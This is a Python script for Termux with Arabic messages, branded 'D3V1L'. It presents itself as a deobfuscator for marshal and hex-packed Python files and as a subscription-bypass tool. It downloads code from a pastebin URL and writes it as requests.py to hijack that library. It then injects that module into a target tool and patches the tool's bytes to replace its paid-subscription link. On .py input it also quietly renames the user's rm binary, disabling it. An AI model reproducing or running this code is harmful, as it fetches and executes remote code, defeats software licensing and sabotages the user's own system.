import os
import requests
import sys
import time
from rich.console import Console
import subprocess
import re

console = Console()
if os.path.exists("requests.py"):
    try:
        os.remove('requests.py')
    except:
        os.system('rm -rf requests.py')
    finally:
        print("\033[1;32m OK 100%")


def cython_Bypass():
    console.print("[+] جاري انشاء حقـن لتخطي الاشتراك")
    time.sleep(3)
    console.print("[+] جــاري اطفاء الحمايات ")
    if os.path.exists('/data/data/com.termux/files/usr/bin/rm'):
        os.system("mv /data/data/com.termux/files/usr/bin/rm /data/data/com.termux/files/usr/bin/1")
    req = requests.get("https://pastebin.com/raw/46CA2uv8").text
    with open("requests.py", 'w') as inject:
        inject.write(req)
    try:
        code = input("\033[1;32m :  حط كود الاشتراك للحقن داخل الملف")
        if code == "":
            os.system('rm -rf requests.py')
            sys.exit()
        r = open("requests.py", 'r').read()
        xxx = r.replace("XXX", code)
        open("requests.py", 'w').write(xxx)
        console.print(f"تـم حقن ملف cython بنجاح", style="bold red3 underline")
        print(f"\033[1;32m {code} كـود الاشتراك")
        sys.exit()
    except ValueError:
        sys.exit("حاول لاحقا")


a = requests.get("https://github.com/trybybass/trybybass/blob/main/app").text
if not "[START]" in a:
    sys.exit("BYE BYE")


def Diss(file, text):
    with open(file, 'w') as file:
        file.write(f'''
import dis,marshal,zlib,base64
code = {text}
code_obj = code


    
dis.dis(code)
    ''')


resutl = subprocess.run("pycdc", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)

if not "input" in resutl.stderr:
    console.print("جاري تثبيت مكاتب c++", style="bold green3")
    os.system(
        'pkg install cmake && pkg install clang && pkg install make && git clone https://github.com/zrax/pycdc && cd pycdc && chmod 777 pycdc.cpp && chmod 777 pycdas.cpp && cmake . && make && mv pycdc $PREFIX/bin')


def find_words(text):
    target_words = ['masrshal', '__marshal__', 'loads', 'import']

    pattern = re.compile(r'\b(?:' + '|'.join(target_words) + r')\b', re.IGNORECASE)

    match = pattern.search(text)

    return bool(match)


def Lambda_Handle(text):
    target_words = ['lambda', '_', 'zlib', 'bas64']

    pattern = re.compile(r'\b(?:' + '|'.join(target_words) + r')\b', re.IGNORECASE)

    match = pattern.search(text)

    return bool(match)


def check_file(text):
    target_words = ['uuid', '(requests)', 'id', 'https']

    pattern = re.compile(r'\b(?:' + '|'.join(target_words) + r')\b', re.IGNORECASE)

    match = pattern.search(text)

    return bool(match)


lines = []


def Handle_Last_Line():
    last = len(lines) - 1
    if lines[last] == "":
        last_conf = len(lines) - 2
        return lines[last_conf]
    else:
        return lines[last]


def Handele_before_last_line():
    bef = len(lines) - 3
    return lines[bef]


def banner():
    c = r"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣶⣶⡜⢿⣿⣿⣿⢿⣿⣿⣿⣧⠘⢿⢿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣦⠙⠿⣿⡞⡏⣿⡿⣿⡄⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⣡⣤⡘⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢉⣹⣿⡀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣷⢰⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠉⣽⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀
⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡏⠁⠀⠀⠋⢛⣿⣿⣿⣿⣧⡄⠀⠀⠀
⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢁⣤⣿⣷⣦⣄⠀⠚⣿⣿⣿⣿⣿⣿⡆⠀⠀
⢀⠰⢿⠧⠀⢻⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠘⠟⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣄⢘⣿⣿⣿⣿⣿⣿⡀⠀
⠸⣿⢿⣷⣤⣿⣿⣿⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿⣿⣿⣿⡿⠁⠀
⠀⢸⣷⣶⣾⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿⣿⣿⣿⠛⠉⠀⠀⠀⠈⢻⣿⣿⣿⣿⠁⠀⠀
⠀⠸⣿⣿⣿⣿⣿⣇⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣈⣿⣿⣿⣿⣿⡆⠀Fuck_py_D3V1L
⠀⠀⢿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⡀⠀⢨⣿⣿⣿⣿⡇⠀⠀
⠀⢠⠞⢻⣿⣿⣿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⠉⠀⠺⣿⣿⣿⣯⠴⢶⡄
⠀⣾⣶⣶⡿⣿⣿⣿⠁⠀⠀⣠⣴⣦⣀⠀⠀⠀⠀⠀⢀⠀⢸⡄⢰⣿⣿⣿⣿⣿⣿⡿⠛⣿⣿⡿⢿⠆⠀⢸⣿⣿⣿⣠⣾⣿
⠀⢻⣹⣿⡇⢸⣿⡏⠀⠀⠟⠋⠉⠈⢻⣧⠀⠀⠀⠀⠈⢷⡀⣿⣾⣿⣿⡟⣻⣿⡟⢁⡾⠋⠁⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡿
⠀⠈⠏⠁⣰⣄⣿⣇⠀⠀⠀⣦⣸⣄⣤⣿⣷⣄⠀⠀⠀⢸⣷⣿⣿⣿⣿⢣⡿⢫⣶⣟⣥⣄⣀⣤⣴⣶⡄⣸⣿⡏⣾⡇⠘⠀
⠀⠀⠀⢸⣿⠋⢻⣿⠀⠀⠀⠘⠟⢻⣟⠉⠙⠛⢷⣤⣴⣼⣡⣇⣿⣿⣇⣻⡶⠿⡿⠟⣉⡿⣿⣿⣿⣿⣿⣿⣿⠁⢻⣧⡀⠀
⠀⠀⠰⡎⢻⣦⣈⣗⠀⠀⠀⠀⠀⠀⠭⣰⣶⣶⠿⠟⠉⠏⠈⠉⣿⣿⢾⣿⣷⣌⣙⣋⣉⣠⣿⣿⣿⣿⡉⠁⡏⢠⡾⠏⠃⠀
⠀⠀⠀⢳⡀⢸⠏⠉⠀⠀⠀⠀⠀⠀⣀⡈⠉⠁⠀⠀⠀⠀⠀⠀⠿⠋⠀⢿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠡⠿⠁⠀⠀⠀
⠀⠀⠀⠀⠉⠀⠀⠀⠀⣶⣶⣶⣶⣾⣿⣿⣦⣤⡄⠀⠀⠀⠀⠀⢾⣿⣶⡾⠿⠟⠻⠿⢿⣿⣿⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⡿⣿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡟⢹⣿⣿⣿⣷⣿⣿⣿⣷⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⢿⣶⣤⡀⠀⠀⠀⢀⣄⡀⠀⠀⣰⠟⢇⣸⣿⠿⣿⣟⡽⣟⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⢻⣿⣿⣷⣶⣤⣀⡀⠙⠦⠴⣿⣾⣿⣿⣿⣿⡿⢿⣾⡿⠉⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⠀⠀⠀⢿⣿⡉⠉⠛⠿⠿⣷⢶⣶⣿⣭⠹⡿⠉⠀⠀⢸⣿⠁⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠀⠀⠀⠘⣿⣧⣤⣀⡀⠀⠁⠀⠋⠀⠀⠀⡀⢠⣤⣴⣿⠇⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣦⠀⠀⠀⠘⣿⣤⠀⠉⠓⠂⠀⠀⠠⠟⠛⢛⠉⣴⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⠳⠄⠀⠀⠘⢿⣦⡄⡀⢀⠀⡀⢠⢀⣼⣼⣿⣿⠃⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⢱⡄⠀⠈⢻⣿⣷⣬⣤⣿⣿⣿⣿⣿⢿⠅⠀⠀⠀⡞⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⢱⡄⠀⠀⠉⠛⢿⣿⣿⣿⣿⠿⠛⠃⠀⠀⠀⣾⠁⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠀⠀⢣⡀⠀⢤⣤⣴⣿⣿⣿⣿⣿⣿⣿⡆⠀⣸⣿⠀⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡄⠀⠈⢣⡀⠀⠙⠉⠉⠙⣛⠛⢿⣿⣿⠇⢠⣿⡟⣢⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⡀⠈⢣⡀⠀⠀⢀⣴⣋⣠⣾⣿⡟⣠⣿⡿⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠦⡄⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⢦⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣿⣍⡉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀'''
            @D3V1L_vip 
            
            Marshal_Bypass_Hex.Decompile
            """
    for letter in c:
        console.print(letter, end="", style="green", highlight=True)
        time.sleep(0.004)


def Clear():
    os.system('rm -rf 1 && rm -rf 2 && rm -rf 3 && rm -rf 4 && mv 5 Fuck_py_D3v1l.py && mv sex DEVIL.info')


def final_banner(layer):
    def typewriter_effect(text, delay=0.05):
        console = Console()

        for char in text:
            console.print(char, end='', style='bold white on red3', highlight=True)
            time.sleep(delay)

    text_to_display = f"تم فك {layer} طبقات بنجاح و استرجاع تشفير الملف الاصلي"
    typewriter_effect(text_to_display)
    print('\033[1;32m File ➼ Fuck_py_D3v1l.py')
    if os.path.exists("DEVIL.info"):
        print('\033[1;32m الملف التحليلي ➼ DEVIL.info')
    sys.exit()


class Bypass:
    def __init__(self, marshal_file):
        banner()
        if os.path.splitext(marshal_file)[1] == ".py":
            cython_Bypass()
        if not os.path.exists(marshal_file):
            sys.exit("\033[2;31m File Not Found")
        self.marshal = marshal_file
        if self.Check_Marshal_File():
            Marshal_File = open(self.marshal, 'r').read()
            if Lambda_Handle(Marshal_File):
                console.print("Marshal=> Lambda = > Bas64 تـم اكتشاف بنجاح", style="bold red3")  ## Lambda
            elif find_words(Marshal_File):
                self.Start_Decompile()  ## marshal
            else:
                sys.exit("\033[2;31m نوع التشفير مش معروف")



        else:
            console.print("جــاري تحليل الملف ي حب", style="bold green3")
            time.sleep(4)
            console.print("تم اكتشاف نوع التشفير هي", style="bold green3")
            name = os.path.basename(self.marshal)
            size_in_bytes = os.path.getsize(self.marshal) / 1024
            console.print(f"نوع التشفير : HEX", style="bold red3 ")
            time.sleep(2)
            console.print(f"اسم الملف : {name}", style="bold red3 ")
            time.sleep(2)
            console.print(f"الحجم تبع الملف :{size_in_bytes:.2f} KB", style="bold red3 ")
            time.sleep(4)
            for i in range(30):
                sys.stdout.write("\033[1;31m =")
                time.sleep(0.01)
            self.Hex_Decompile()

    def Hex_Decompile(self):
        try:
            subprocess.run(f"pycdc {self.marshal} > 1", shell=True)
            with open("1", 'r') as Rep:
                a = Rep.read()
            one = a.replace("exec", "#exec")
            open("1", 'w').write(one)
            with open("1", 'r') as NewEdit:
                edition = NewEdit.read()
            handle_my_line = edition.split("\n")
            for handle_line in handle_my_line:
                lines.append(handle_line)
            decompile_string = "print(''.join([chr(i)for i in _]))"
            first = edition.replace(Handle_Last_Line(), decompile_string)
            final = first.replace(Handele_before_last_line(), "")
            with open("1", 'w') as final_edit:
                final_edit.write(final)
            subprocess.run("python 1 > 2", shell=True)
            with open("2", 'rb') as Check:
                bk = Check.read().decode("utf-8")
            if find_words(bk):
                self.Hex_To_Raw()
            else:
                os.system('rm -rf 1')
                console.print("  File: Fuck_py_D3v1l.py\nتم استرجاع الملف للطبقة الاصلية", style="bold green3")
                self.Decode_Zlib_Base()
        except Exception as e:
            print(e)
            c = br''

    def Decode_Zlib_Base(self):
        c = 0
        r = open('2', 'r').read()
        one = r.replace("exec", "print")
        open('2', 'w').write(one)
        for i in range(10):
            c += 1
            console.print(f"تـم فك طبقة {c}", style="bold green3 underline")
            os.system('python 2 > 3')
            tow = open('3', 'r').read()
            three = tow.replace('b"exec', "print")
            four = three.replace('"', '')
            open('2', 'w').write(four)
            rc = open('3', 'r').read()
            if check_file(rc):
                break
        open('3', 'a').write("open('Fuck_py_D3v1l.py','w').write(str(c.decode('utf-8')))")
        original_file_path = '3'
        temp_file_path = 'aa.txt'
        new_data = 'c='
        with open(original_file_path, 'r') as original_file:
            existing_content = original_file.read()
        with open(temp_file_path, 'w') as temp_file:
            temp_file.write(new_data)
            temp_file.write(existing_content)
        os.replace(temp_file_path, original_file_path)
        os.system('python 3 > Fuck_py_D3v1l.py')
        os.system('rm -rf 2 && rm -rf 3 ')
        final_banner(c)

    def Hex_To_Raw(self):
        c = 0
        one_text = open('2', 'r').read()
        tow_text = one_text.replace("exec(", "")
        three_text = tow_text[:-2]
        open('2', 'w').write(f'''
import marshal,zlib,base64,dis
code = {three_text}
dis.dis(code)''')
        for i in range(10):
            c += 1
            os.system('python 2 > sex')
            check = open('sex', 'r').read()
            if not check_file(check):
                self.Dis_Leyers()
            else:
                break
        final = open('2', 'r').read()
        one = final.replace("code = marshal.loads", "print")
        tow = one.replace("dis.dis(code)", "")
        open('3', 'w').write(tow)
        os.system('python 3 > 4')
        four = open('4', 'r').read()
        five = four.replace("\n", "")
        with open('5', 'w') as keyfile:
            keyfile.write(f'''
import marshal
exec(marshal.loads({five}))
''')
        Clear()
        print('\n')
        final_banner(c)

    def Dis_Leyers(self):
        check_sex = open('sex', 'r').read()
        for max_text in check_sex.split("\n"):
            for text in max_text.split("               "):
                if len(text) > 300:
                    one = text.replace("3 ", "")
                    tow = one.replace(")", "[::-1])")
                    open('2', 'w').write(f'''
import dis,marshal,zlib,base64
code = marshal.loads(zlib.decompress(base64.b64decode{tow}))
dis.dis(code)
''')

    def Start_Decompile(self):
        try:

            vulan = requests.get("https://pastebin.com/raw/46CA2uv8").text

        except requests.exceptions.RequestException:

            sys.exit("Internet Connection")
        with open("requests.py", 'w') as req:
            req.write(vulan)
        console.print("جاري سحب رابط الاشتراك تبع الاداه", style="bold red3")

        time.sleep(2)

        subprocess.run(f"python {self.marshal}", stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True,
                       shell=True)
        if os.path.exists("urls.txt"):

            if os.path.getsize("urls.txt") > 4:
                pass

            else:
                sys.exit("لم يتم العثور على الرابط")

        else:
            sys.exit("فشلت عملية سحب رابط الاشتراك")
        with open("urls.txt", 'r') as url:
            links = url.read()

        console.print(links, style="bold cyan")

        subc = input("انسخ رابط الاشتراك وحطه هنـي :")

        os.system("rm -rf reqeusts.py")

        if self.Check_Link_Bytes(subc):
            pass
        else:
            sys.exit('فشل العثور على الاشتراك من الاداة')
        my_links = input("ضع رابط اشتراكك هنا :  ")
        console.print("مــلاحظه : كان رابط الاداة يحتوي على raw يرجى وضع مثله لضمان نتيجه", style="bold red3")
        self.FUCK_Py(my_links, subc)

    def FUCK_Py(self, new_link, old_link):
        old = old_link.encode("utf-8")
        new = new_link.encode("utf-8")
        with open(self.marshal, 'rb') as marshal:
            encoded_text = marshal.read()
        encoded_bytearray = bytearray(encoded_text)
        position = encoded_bytearray.find(old)

        encoded_bytearray[position:position + len(new)] = new

        modified_encoded_text = bytes(encoded_bytearray)
        os.system("rm -rf requests.py")
        console.print("تم فك التشفير بنجاح", style="bold white on green")
        open("Fuck_py_D3v1l.py", 'w').write(f'exec({str(modified_encoded_text)})')
        sys.exit("Fuck_py_D3v1l.py")

    def Check_Link_Bytes(self, link):
        with open(self.marshal, 'rb') as marshal:
            encoded_text = marshal.read()
        old = link.encode("utf-8")
        old_link = old

        encoded_bytearray = bytearray(encoded_text)
        position = encoded_bytearray.find(old_link)

        if position != -1:
            return True
        else:
            return False

    def Check_Marshal_File(self):
        try:
            with open(self.marshal, 'rb') as UnknownFile:
                Enc = UnknownFile.read().decode("utf-8")
            if find_words(Enc):
                return True
            else:
                console.print("نـوع تشفير غير معروف", style="bold red3 underline")
                sys.exit()
        except Exception as e:
            if e == "'utf-8' codec can't decode byte 0xce in position 1151: invalid continuation byte":
                sys.exit("الملف مش مشفر")
            else:
                return False

Bypass
